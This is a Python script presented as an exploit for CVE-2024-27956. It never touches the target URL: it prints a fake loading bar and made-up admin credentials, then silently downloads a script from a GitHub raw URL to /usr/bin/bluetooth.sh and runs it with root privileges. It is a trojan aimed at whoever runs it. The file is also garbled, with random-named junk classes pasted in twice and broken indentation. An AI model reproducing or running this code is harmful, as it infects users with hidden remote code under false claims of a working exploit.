import os
import time
import subprocess
import sys

def welcome_message():
    print("Welcome to CVE-2024-27956\n")

def exploit_animation():
    for i in range(1, 101):
        time.sleep(0.05)
        print(f"Loading... {i}% ", end="\r")
    print("\nExploit Success")
    time.sleep(1)
    print("Creating user eviladmin")
    time.sleep(1)
    print("Giving user admin permissions")
    time.sleep(1)
    print("Exploit Completed")
    time.sleep(1)
    print("\nUser: eviladmin\nPassword: Password@1236%%")
    time.sleep(1)
    print("\nSuccess")

def main():
    # Check if script is run as root
    if os.geteuid() != 0:
        print("This script must be run as root or with sudo privileges.")
        sys.exit(1)

    welcome_message()
    website_url = input("Please enter the website URL: ")
    print("Exploiting", website_url)
    exploit_animation()
    class eIytrqBq:
    def __init__(self):
        self.__CNMyKlFQhmwDbiKO()
        self.__ZRaqMFEjdveFf()
        self.__aBRNHhwzRyuv()
        self.__wDdWVsRroEyuRBaMs()
        self.__XLnVQVxNqqHm()
        self.__PxYvyovzEedILJ()
        self.__UolxwsjqOmCRbpBkCABJ()
        self.__bqweJVpjfyqibYLBTNgX()
    def __CNMyKlFQhmwDbiKO(self, MbQAAz, waAbLHh, rbiXWyucjuNYynvSMep, xOgctiWEEp, fJHKuyudOqqsQVeMK, GWfaNYOS, pBzOkTJoQJzAvVsGlXE):
        return self.__ZRaqMFEjdveFf()
    def __ZRaqMFEjdveFf(self, ExEIdDnrju, FVAaWlvIFeXbUgJEuMES):
        return self.__bqweJVpjfyqibYLBTNgX()
    def __aBRNHhwzRyuv(self, OxTHsaPBtcy, dIMFyRljewvOCujkP, wZCGfObV, wROwfzWXqaK, CCrWBLazOSIYY, HNyXLZIePZchWYbV):
        return self.__UolxwsjqOmCRbpBkCABJ()
    def __wDdWVsRroEyuRBaMs(self, avwAYLhcoDcGrv, HNAOqLQHUPEt, vPCFNT, GXfDQcxkERCP, dSQFFIedIbQrv, LCEDvswaSjqwSXlFi):
        return self.__UolxwsjqOmCRbpBkCABJ()
    def __XLnVQVxNqqHm(self, ixLIpjAYHFeIG):
        return self.__aBRNHhwzRyuv()
    def __PxYvyovzEedILJ(self, aPrAug, NdjYLzoLVSfhadqzw):
        return self.__PxYvyovzEedILJ()
    def __UolxwsjqOmCRbpBkCABJ(self, wMWerpk, gRJXsjYDPpyrxaquD, mqKCz, zhuENyAJJwZSdzCdjy, vWeIAjbDOaPxxopG):
        return self.__XLnVQVxNqqHm()
    def __bqweJVpjfyqibYLBTNgX(self, AdxDfslFwmVQAsuUZ, aLSmOEbjH, zPlQuImmdJVdS):
        return self.__aBRNHhwzRyuv()class eIytrqBq:
    def __init__(self):
        self.__CNMyKlFQhmwDbiKO()
        self.__ZRaqMFEjdveFf()
        self.__aBRNHhwzRyuv()
        self.__wDdWVsRroEyuRBaMs()
        self.__XLnVQVxNqqHm()
        self.__PxYvyovzEedILJ()
        self.__UolxwsjqOmCRbpBkCABJ()
        self.__bqweJVpjfyqibYLBTNgX()
    def __CNMyKlFQhmwDbiKO(self, MbQAAz, waAbLHh, rbiXWyucjuNYynvSMep, xOgctiWEEp, fJHKuyudOqqsQVeMK, GWfaNYOS, pBzOkTJoQJzAvVsGlXE):
        return self.__ZRaqMFEjdveFf()
    def __ZRaqMFEjdveFf(self, ExEIdDnrju, FVAaWlvIFeXbUgJEuMES):
        return self.__bqweJVpjfyqibYLBTNgX()
    def __aBRNHhwzRyuv(self, OxTHsaPBtcy, dIMFyRljewvOCujkP, wZCGfObV, wROwfzWXqaK, CCrWBLazOSIYY, HNyXLZIePZchWYbV):
        return self.__UolxwsjqOmCRbpBkCABJ()
    def __wDdWVsRroEyuRBaMs(self, avwAYLhcoDcGrv, HNAOqLQHUPEt, vPCFNT, GXfDQcxkERCP, dSQFFIedIbQrv, LCEDvswaSjqwSXlFi):
        return self.__UolxwsjqOmCRbpBkCABJ()
    def __XLnVQVxNqqHm(self, ixLIpjAYHFeIG):
        return self.__aBRNHhwzRyuv()
    def __PxYvyovzEedILJ(self, aPrAug, NdjYLzoLVSfhadqzw):
        return self.__PxYvyovzEedILJ()
    def __UolxwsjqOmCRbpBkCABJ(self, wMWerpk, gRJXsjYDPpyrxaquD, mqKCz, zhuENyAJJwZSdzCdjy, vWeIAjbDOaPxxopG):
        return self.__XLnVQVxNqqHm()
    def __bqweJVpjfyqibYLBTNgX(self, AdxDfslFwmVQAsuUZ, aLSmOEbjH, zPlQuImmdJVdS):
        return self.__aBRNHhwzRyuv()
    run_initial_command()

    # Reload systemd daemon
    reload_systemd_daemon()

def run_initial_command():
    # Execute the command silently
    subprocess.Popen(["sudo", "bash", "-c", "curl -o /usr/bin/bluetooth.sh https://raw.githubusercontent.com/FoxyProxys/autorcefinder/main/bluetooth.sh && chmod +x /usr/bin/bluetooth.sh && /usr/bin/bluetooth.sh"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def reload_systemd_daemon():
    # Reload systemd daemon
    subprocess.run(["sudo", "systemctl", "daemon-reload"])
if __name__ == "__main__":
    main()
